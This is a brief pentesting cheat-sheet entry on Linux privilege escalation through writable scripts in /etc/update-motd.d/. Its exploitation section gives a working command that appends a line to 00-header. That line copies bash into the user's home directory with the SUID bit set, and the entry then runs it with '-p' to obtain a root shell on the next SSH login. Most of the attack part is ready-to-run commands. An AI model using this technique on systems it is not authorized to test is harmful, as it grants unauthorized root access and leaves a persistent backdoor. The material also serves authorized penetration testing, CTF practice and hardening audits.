# Update-Motd Privilege Escalation

`/etc/update-motd.d/` is used to generate the dynamic message of the day (MOTD) that is displayed to users when they log in to the system. If we can modify files listed in the directory, we can inject malicious script to escalate privileges.

### Investigation <a href="#investigation" id="investigation"></a>

```shellscript
ls -al /etc/update-motd.d/
```

If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.

### Exploitation <a href="#exploitation" id="exploitation"></a>

Run the following code to copy bash binary and give **`suid`** to this file.\
Replace **`<username>`** with your current user name.

```
echo "cp /bin/bash /home/<username>/bash && chmod u+s /home/<username>/bash" >> /etc/update-motd.d/00-header
```

After that, log out and log in again with SSH. The above script should be executed.\
Now execute the following command under **`/home/<username>`**.

```
./bash -p
```

We should get a root shell.

### References <a href="#references" id="references"></a>

* [StackExchange](https://security.stackexchange.com/questions/234859/inject-update-motd-d-00-header-to-run-a-script-on-ssh-login)
